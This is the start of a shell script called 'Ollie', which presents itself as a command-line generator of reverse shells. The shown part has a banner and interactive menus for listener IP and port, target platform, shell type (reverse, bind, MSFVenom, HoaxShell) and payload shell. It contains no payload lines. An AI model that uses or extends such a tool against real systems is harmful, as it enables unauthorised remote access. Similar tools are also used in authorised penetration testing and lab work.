#!/bin/sh
#
#
#
#
#
banner() {
echo ""
echo "############################ Ollie #############################" 
echo "#							       #"
echo "#		  mmmm  \"\"#    \"\"#      \"		       #"
echo "#		 m'  'm   #      #    mmm     mmm	       #"
echo "#		 #    #   #      #      #    #\"  #	       #"
echo "#		 #    #   #      #      #    #\"\"	       #"
echo "#		  #mm#    \"mm   \"mm   mm#mm  \"#mm\"	       #"
echo "#							       #"
echo "#  ~ A Command Line Interface for generating Reverse Shells ~  #"
echo "# 							       #"
echo "#                	   by lf32 			       #"
echo "#                	   				       #"
echo "############################ Ollie #############################"
}
banner


#
# Socket = IP + PORT
#
socket() {
	echo ""
	read -p "Enter The IP Address [Default=10.10.10.10]: " IP
	[ -z "$IP" ] && IP="10.10.10.10"
	read -p "Enter The Port Number	    [Default=9001]: " PORT
	[ -z "$PORT" ] && PORT="9001"
}
socket

#
# Platform
#
platform() {
	echo ""
	echo "Choose The Platform You Want To Go With"
	echo "[1] Linux\t[2] Windows\t[3] Mac"
	read -p "Pick a number from above [Default=1]: " pl4tf0rm	
}
platform

#
# Generate Shell Type
#
genShell() {
	echo ""
	echo "Choose The Shell You Want To Generate"
	echo "[1] Reverse\t[2] Bind\t[3] MSFVenom\t[4] HoaxShell"
	read -p "Pick a number from above [Default=1]: " g3n5h3ll
}
genShell


#
# Reverse Shell
# 
# Payload Shell Type
#
revPayloadShell() {
	echo ""
	echo "[REVERSE SHELL] Choose The Payload Shell To Use"
	echo "[1] sh\t\t[2] /bin/sh\t[3] bash\t[4] /bin/bash\t[5] cmd"
	echo "[6] powershell\t[7] pwsh\t[8] ash\t\t[9] bsh\t\t[10] csh"
	echo "[11] ksh\t[12] zsh\t[13] pkdsh\t[14] tcsh\t[15] mksh"
	echo "[16] dash"
	read -p "Pick a number from above [Default=1]: " r3vp4yl04d5h3ll
}
revPayloadShell
